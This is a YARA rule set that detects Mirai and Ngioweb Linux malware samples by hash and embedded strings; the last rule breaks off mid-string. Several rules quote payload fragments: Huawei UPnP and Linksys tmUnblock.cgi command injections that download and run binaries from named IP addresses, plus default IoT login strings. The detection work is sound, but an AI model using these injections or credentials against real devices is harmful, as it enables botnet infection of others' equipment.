/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-10
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule Mirai_signature__e03b4ce9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e03b4ce9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e03b4ce9aee4810a2c8f53cb8a2314ef87366a2f024b892408b8da2c196a1e53"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e48cb7dc {
   meta:
      description = "_subset_batch - file Mirai(signature)_e48cb7dc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e48cb7dcf8bc012d869098cb38f2a46ebadccdbd5542714c1e02af76f1baa09a"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__e91818c6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e91818c6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e91818c6cc9390de865241451cabedffe439c188571a6dd1fba24e91955268cb"
   strings:
      $s1 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s2 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s5 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s6 = "tvmrepa" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__f0178160 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f0178160.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f0178160c0756d2394cf660a8b76c4481b4226544e812a5ad393461105d2e8e3"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f06f1acc {
   meta:
      description = "_subset_batch - file Mirai(signature)_f06f1acc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f06f1acc70c897d4f05ca10c53cff3fa13357ea17609c9ad359b3aaf0672d5d1"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f5a5c121 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f5a5c121.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5a5c1210af431f764a19a4eecdc129b58956806b340edb6abb8e79e97229d14"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '43.00'*/
      $s2 = "76.65.148.18 -l /tmp/bigH -r /bins/mips;chmod 777 /tmp/bigH;/tmp/bigH huawei.rep.mips;rm -rf /tmp/bigH)</NewStatusURL><NewDownlo" ascii /* score: '26.00'*/
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(busybox wget -" ascii /* score: '20.00'*/
      $s4 = "POST /tmUnblock.cgi HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s5 = "User-Agent: python-requests/2.20.0" fullword ascii /* score: '17.00'*/
      $s6 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s7 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s8 = "Host: 1.1.1.1:80" fullword ascii /* score: '14.00'*/
      $s9 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s10 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
      $s11 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__e803f313 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e803f313.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e803f313d93366fab2fd9002b059ed150aa1cccb9fc4a7d704a0174bc2e1cc7e"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownlo" ascii /* score: '20.00'*/
      $s3 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s5 = "fddldlfb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__ea586c8c {
   meta:
      description = "_subset_batch - file Mirai(signature)_ea586c8c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ea586c8cfa1fd42bbfc8f8a2eb918d10716b94f9c442b54d8923b60651478708"
   strings:
      $s1 = "/bin/systemd" fullword ascii /* score: '10.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e2cbe7db {
   meta:
      description = "_subset_batch - file Mirai(signature)_e2cbe7db.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e2cbe7dbb0e862c92cdbe017b439d77980d5291e854700920af2380d0d8b8f98"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d" fullword ascii /* score: '25.50'*/
      $s3 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s4 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s5 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s6 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s7 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s8 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s9 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s10 = "ps -e -o pid,args=" fullword ascii /* score: '9.00'*/
      $s11 = "busybox" fullword ascii /* score: '8.00'*/
      $s12 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__ef582ff9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ef582ff9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ef582ff99e4e11c69e4df819de52537d5d54f49b1f929e7aa18cab1129ec780b"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s3 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "kworker" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__ea262400 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ea262400.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ea2624005802141c9227622ec12270720350f9f0b078aa84b80cedd2d761c6c3"
   strings:
      $s1 = "/bin/systemd" fullword ascii /* score: '10.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__eb77e030 {
   meta:
      description = "_subset_batch - file Mirai(signature)_eb77e030.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eb77e030a3bbe742ac832bc306fc0e654a782ef06c9801853368df56dadd25b2"
   strings:
      $s1 = "/bin/systemd" fullword ascii /* score: '10.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__f9cc96d8 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f9cc96d8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f9cc96d81224e5fa2de6fa2911509d8c6d0fb4e09ad91608e42c8a95155e726b"
   strings:
      $s1 = "/bin/systemd" fullword ascii /* score: '10.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
      $s3 = "0/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__fbd136f0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fbd136f0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fbd136f0f22fcd4287ee3c9ee163e482ce5168b7da535b36ad558c5d62d4cb4f"
   strings:
      $s1 = "/bin/systemd" fullword ascii /* score: '10.00'*/
      $s2 = "FTPjGNRGP\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__e8932821 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e8932821.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e89328219e412a061745f826ee6ad9be1a56ea91de224f3178a93b63375604b9"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownlo" ascii /* score: '20.00'*/
      $s3 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s5 = "fddldlfb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__f6d51273 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f6d51273.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f6d512731701decf6d190664168ba078b7fafa2455a0ea8be00d6a94ad1c5b74"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownlo" ascii /* score: '20.00'*/
      $s3 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s5 = "fddldlfb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__f68a6165 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f68a6165.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f68a61656a080aee283afca75a83262dee6ae60100170e614cc211bfb83f75ea"
   strings:
      $s1 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s2 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
      $s3 = "netstat" fullword ascii /* score: '8.00'*/
      $s4 = "udevadm" fullword ascii /* score: '8.00'*/
      $s5 = "killall" fullword ascii /* score: '8.00'*/
      $s6 = "iptables" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__e76ad9b5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e76ad9b5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e76ad9b5ac59b0738e4b03a9261e65e626bb3c194a211b2ab16bcc0641da1466"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f613d5b4 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f613d5b4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f613d5b40fc3ec33584e3342efe750c55f4cf4113a9b903c26f5f473855acbc5"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__ff04a0f1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ff04a0f1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff04a0f199ea72e1dcff502ac090767f0e3369760ee4363643d862cb424fa54e"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e049f302 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e049f302.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e049f3020634270b35439831b380c8ea470bbfa0d9ccdc7c51d20c9f91c4d889"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d" fullword ascii /* score: '25.50'*/
      $s3 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s4 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s5 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s6 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s7 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s8 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s9 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s10 = "ps -e -o pid,args=" fullword ascii /* score: '9.00'*/
      $s11 = "busybox" fullword ascii /* score: '8.00'*/
      $s12 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__edd16e1f {
   meta:
      description = "_subset_batch - file Mirai(signature)_edd16e1f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "edd16e1f5bcf73548168caaae58ce82c8b9597d89af6a3298b366afb9cd373fd"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d" fullword ascii /* score: '25.50'*/
      $s3 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s4 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s5 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s6 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s7 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s8 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s9 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s10 = "ps -e -o pid,args=" fullword ascii /* score: '9.00'*/
      $s11 = "busybox" fullword ascii /* score: '8.00'*/
      $s12 = "dockerd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__f3b2cf6f {
   meta:
      description = "_subset_batch - file Mirai(signature)_f3b2cf6f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f3b2cf6f12d28b87f07b80f0858456e0ab7b3078ad480c202bb4df5d162aaf43"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d" fullword ascii /* score: '25.50'*/
      $s3 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s4 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s5 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s6 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s7 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s8 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s9 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s10 = "ps -e -o pid,args=" fullword ascii /* score: '9.00'*/
      $s11 = "busybox" fullword ascii /* score: '8.00'*/
      $s12 = "dockerd" fullword ascii /* score: '8.00'*/
      $s13 = "kworker" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__eac06a5b {
   meta:
      description = "_subset_batch - file Mirai(signature)_eac06a5b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eac06a5b594516e97159c79330ce1cf2f6a2454558934ca349bf901d57888426"
   strings:
      $s1 = "User-Agent: Update v1.0" fullword ascii /* score: '17.00'*/
      $s2 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s3 = "dropbear" fullword ascii /* score: '10.00'*/
      $s4 = "condi2 %s:%d" fullword ascii /* score: '9.50'*/
      $s5 = "busybox" fullword ascii /* score: '8.00'*/
      $s6 = "webserv" fullword ascii /* score: '8.00'*/
      $s7 = "ropbear" fullword ascii /* score: '8.00'*/
      $s8 = "telnetd" fullword ascii /* score: '8.00'*/
      $s9 = "netstat" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__eb1f8582 {
   meta:
      description = "_subset_batch - file Mirai(signature)_eb1f8582.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eb1f85827a420c40530498825a012496e564c5b84bbeee3a10d907d327b83eb0"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s3 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "kworker" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__f39296b2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f39296b2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f39296b2e9a84e9c9c7875560edc271ca3baf8cdb58eccba0f679ab197c5df4d"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s3 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__f5fb1332 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f5fb1332.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5fb133297a6b13a5747610284b869759fa13310c27b6500758d584fec0a7dd3"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s3 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__fab6897b {
   meta:
      description = "_subset_batch - file Mirai(signature)_fab6897b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fab6897bbd500129326b544e48e6e00d2ff72428548a3cec34e14833b6095e11"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
      $s3 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__f29eec20 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f29eec20.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f29eec205097ae3f1257a63702814a3444448c440ec904c88464eb44346833f8"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for x86_64" fullword ascii /* score: '17.50'*/
      $s2 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
      $s3 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
      $s4 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s5 = "exec_unnamed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ngioweb_signature__0b899bb6 {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_0b899bb6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b899bb64e7aa88b570de8eab24f5f686f5b5248148fa2510d1097f7bafb3eda"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "attemptsH" fullword ascii /* score: '11.00'*/
      $s3 = "Host: H" fullword ascii /* score: '9.00'*/
      $s4 = "content-H" fullword ascii /* score: '9.00'*/
      $s5 = "GDPOST" fullword ascii /* score: '8.50'*/
      $s6 = "uname -a" fullword ascii /* score: '8.00'*/
      $s7 = "mnprstvx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Ngioweb_signature__2d434a6e {
   meta:
      description = "_subset_batch - file Ngioweb(signature)_2d434a6e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2d434a6e743e9dfae650f3443b56a5f90e6764ee4dee3fefd2a36f7db55ee36e"
   strings:
      $s1 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s2 = "attemptsL" fullword ascii /* score: '11.00'*/
      $s3 = "Host: H" fullword ascii /* score: '9.00'*/
      $s4 = "content-gH" fullword ascii /* score: '9.00'*/
      $s5 = "mnprstvx" fullword ascii /* score: '8.00'*/
      $s6 = "uname -aH" fullword ascii /* score: '8.00'*/
      $s7 = "D$ /tmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__e98282de {
   meta:
      description = "_subset_batch - file Mirai(signature)_e98282de.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e98282deecfcb188f990ec57f251555bb8424ffd9a492afb7432570b60dfa969"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "miraisucks.lol" fullword ascii /* score: '10.00'*/
      $s3 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s4 = "juantech" fullword ascii /* score: '8.00'*/
      $s5 = "dreambox" fullword ascii /* score: '8.00'*/
      $s6 = "xmhdipc" fullword ascii /* score: '8.00'*/
      $s7 = "avocent" fullword ascii /* score: '8.00'*/
      $s8 = "root126" fullword ascii /* score: '8.00'*/
      $s9 = "realtek" fullword ascii /* score: '8.00'*/
      $s10 = "cxlinux" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e7f80d92 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e7f80d92.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e7f80d926272f05557063c1f17d8a2c3f66414e79acdab604655e00e479a7e23"
   strings:
      $s1 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
